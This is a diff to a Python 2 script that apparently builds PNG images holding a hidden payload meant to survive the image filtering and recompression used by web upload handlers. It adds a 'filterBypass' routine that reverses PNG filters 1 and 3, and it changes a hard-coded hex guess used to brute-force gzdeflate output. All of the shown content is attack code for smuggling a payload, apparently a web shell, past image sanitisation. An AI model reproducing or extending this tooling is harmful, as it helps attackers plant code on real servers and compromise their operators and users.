@@ -62,6 +62,32 @@ def calcBruteMethod(remoteDomain, prefix, tld):
 		print "[+] Unknown tld, attempting slow method"
 		gzdeflatePayload = vakamilBrute(targetPayload, prefix, tld)
 		return gzdeflatePayload
+def filterBypass(gzdeflatePayload):
+	print "[+]Crafting payload to bypass PNG filters..."
+	payload=[]
+	#Convert hex string into hex lists
+	pList = [gzdeflatePayload[i:i+2] for i in range(0,len(gzdeflatePayload), 2)]
+	hPlist1 = [int(('0x'+i),16) for i in pList]
+	hPlist2 = []
+
+	#reverse filter 1
+	i=0
+	while i < (len(hPlist1)-3):
+		hPlist1[i+3] = (hPlist1[i+3] + hPlist1[i]) % 256
+		i+=1
+	for filter1 in hPlist1:
+		hPlist2.append(filter1)
+
+	#reverse filter 3
+	i = 0
+	while i < (len(hPlist2)-3):
+		hPlist2[i+3] = (hPlist2[i+3] + floor(hPlist2[i] / 2)) % 256
+		i += 1
+	for filter3 in hPlist2:
+		payload.append(filter3)
+	print "[+]Filter-Proof Payload Crafted!"
+	#print "Filter-Proof Payload: %s" % payload
+	return payload
 
 def generateFinalPayload(payload, outputImage):
 	#Thanks to admanLogue and hLk_886 for this PNG Code
@@ -102,8 +128,8 @@ def aLogue(targetPayload, prefix):
 		brute = hex(start)[2:]
 		if "L" in brute:
 			brute = brute[:-1]
-		guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
-		#guess = 'f399281922111510691928276e6e6020201e581b1f576e69b16375535b6f0e7f'
+		#guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
+		guess = 'f399281922111510691928276e6e6020201e581b1f576e69b16375535b6f0e7f'
 		deflate = gzdeflate(hex2bin(guess))
 		
 		if targetPayload.upper() in deflate.upper():
